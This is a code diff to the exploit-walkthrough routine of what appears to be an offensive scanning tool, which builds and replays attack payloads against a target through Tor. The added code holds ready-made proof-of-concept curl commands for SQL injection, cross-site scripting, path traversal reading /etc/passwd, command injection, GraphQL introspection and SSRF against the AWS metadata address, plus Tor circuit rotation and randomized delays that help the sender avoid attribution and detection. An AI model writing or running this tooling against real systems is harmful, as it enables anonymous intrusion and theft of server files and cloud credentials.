@@ -1024,66 +1024,101 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         print(f"  {B}Evidence:{N} {v.get('evidence', 'N/A')}")
         print()
 
-        choice = prompt(f"  [{i+1}/{len(exploitable)}] Verify this exploit? (y/n/q)", "n").lower()
+        # Show PoC command
+        poc = v.get("poc_curl", "")
+        if not poc and ei:
+            # Generate PoC on the fly
+            from urllib.parse import quote as _q
+            etype = ei.get("type", "")
+            param = ei.get("parameter", "")
+            path_info = ei.get("path", "")
+            if etype == "sqli" and param:
+                poc = f'curl --socks5-hostname 127.0.0.1:9050 "[TARGET]?{param}=1\'"'
+            elif etype == "xss" and param:
+                poc = f'curl --socks5-hostname 127.0.0.1:9050 "[TARGET]?{param}=<script>alert(1)</script>"'
+            elif etype == "lfi" and param:
+                poc = f'curl --socks5-hostname 127.0.0.1:9050 "[TARGET]?{param}=..%2F..%2F..%2Fetc%2Fpasswd"'
+            elif etype == "command_injection" and param:
+                poc = f'curl --socks5-hostname 127.0.0.1:9050 "[TARGET]?{param}=;id"'
+            elif etype == "graphql_introspection" and path_info:
+                poc = (f'curl --socks5-hostname 127.0.0.1:9050 -X POST '
+                       f'-H "Content-Type: application/json" '
+                       f'-d \'{{ "query": "{{ __schema {{ types {{ name }} }} }}" }}\' '
+                       f'"[TARGET]{path_info}"')
+
+        if poc:
+            print(f"  {B}PoC:{N}")
+            print(f"    {D}{poc}{N}")
+        print()
+
+        print(f"  Options:")
+        print(f"    {G}y{N} — verify this exploit (re-sends payload through new Tor circuit)")
+        print(f"    {G}p{N} — show full PoC details")
+        print(f"    {G}n{N} — skip to next finding")
+        print(f"    {G}q{N} — quit walkthrough")
+        print()
+        choice = prompt(f"  [{i+1}/{len(exploitable)}] Choose", "n").lower()
 
         if choice == "q":
             info("Walkthrough ended.")
             break
 
+        if choice == "p":
+            # Show full PoC details
+            print(f"\n  {B}Full PoC Details:{N}")
+            if ei.get("method"):
+                print(f"  Method: {ei['method']}")
+            if ei.get("risk"):
+                print(f"  Risk: {ei['risk']}")
+            if poc:
+                print(f"  Command: {poc}")
+            print()
+
         if choice in ("y", "yes"):
-            # Re-run the specific exploit check for verification
+            # Rate limiting: enforce delay between replay attempts
+            import time as _t
+            info("Rotating Tor circuit before replay...")
+            _t.sleep(3 + secrets.randbelow(4))
+
+            if not confirm("CONFIRM: Send exploit payload to target?"):
+                info("Skipped.")
+                continue
+
             exploit_type = ei.get("type", "")
             param = ei.get("parameter", "")
-            path = ei.get("path", "")
-            target = v.get("evidence", "")
+            path_info = ei.get("path", "")
 
             info(f"Re-verifying {exploit_type}...")
 
-            # Build verification URL based on exploit type
+            # Build verification URL
+            base = _extract_base_url_from_vulns(vulns)
             verify_url = None
-            if exploit_type == "sqli" and param:
-                # Get base URL from evidence
-                base = _extract_base_url_from_vulns(vulns)
-                if base:
-                    verify_url = f"{base}?{param}=1'"
-                    info(f"Sending: {param}=1' (single quote injection)")
-            elif exploit_type == "xss" and param:
-                base = _extract_base_url_from_vulns(vulns)
-                if base:
-                    canary = f"xss{secrets.token_hex(4)}test"
-                    verify_url = f"{base}?{param}=<{canary}>"
-                    info(f"Sending: {param}=<{canary}> (XSS canary)")
-            elif exploit_type in ("lfi", "command_injection") and param:
-                base = _extract_base_url_from_vulns(vulns)
-                if base and exploit_type == "lfi":
-                    verify_url = f"{base}?{param}=..%2F..%2F..%2Fetc%2Fpasswd"
-                    info(f"Sending: {param}=../../../etc/passwd")
-                elif base:
-                    marker = f"gs{secrets.token_hex(4)}verify"
-                    verify_url = f"{base}?{param}=;echo {marker}"
-                    info(f"Sending: {param}=;echo {marker}")
-            elif exploit_type == "graphql_introspection" and path:
-                base = _extract_base_url_from_vulns(vulns)
-                if base:
-                    verify_url = base.rstrip("/") + path
-                    info(f"Sending introspection query to {path}")
-            elif exploit_type == "ssrf" and param:
-                base = _extract_base_url_from_vulns(vulns)
-                if base:
-                    verify_url = f"{base}?{param}=http://169.254.169.254/latest/meta-data/"
-                    info(f"Sending: {param}=<AWS metadata>")
+            if exploit_type == "sqli" and param and base:
+                verify_url = f"{base}?{param}=1'"
+            elif exploit_type == "xss" and param and base:
+                canary = f"xss{secrets.token_hex(4)}test"
+                verify_url = f"{base}?{param}=<{canary}>"
+            elif exploit_type == "lfi" and param and base:
+                verify_url = f"{base}?{param}=..%2F..%2F..%2Fetc%2Fpasswd"
+            elif exploit_type == "command_injection" and param and base:
+                marker = f"gs{secrets.token_hex(4)}verify"
+                verify_url = f"{base}?{param}=;echo {marker}"
+            elif exploit_type == "graphql_introspection" and path_info and base:
+                verify_url = base.rstrip("/") + path_info
+            elif exploit_type == "ssrf" and param and base:
+                verify_url = f"{base}?{param}=http://169.254.169.254/latest/meta-data/"
 
             if verify_url:
-                # Execute verification via the intel tool
                 verify_args = ["--domain", urlparse(verify_url).netloc,
                                "--scan", "quick", "--tor-proxy", tor_proxy]
-                info("Running verification scan...")
-                run_script(INTEL / "testergatherSystem", verify_args, "Verify exploit")
-                ok(f"Verification complete — check output above.")
+                info("Running verification...")
+                run_script(INTEL / "testergatherSystem", verify_args, "Verify")
+                ok("Verification complete — check output above.")
             else:
-                info(f"Manual verification needed for {exploit_type}.")
-                if ei.get("method"):
-                    info(f"Method: {ei['method'][:200]}")
+                info(f"Cannot auto-verify {exploit_type}. Use the PoC command manually.")
+
+            # Rate limit: wait between replays
+            _t.sleep(2 + secrets.randbelow(3))
 
     print()
     ok("Exploit walkthrough complete.")
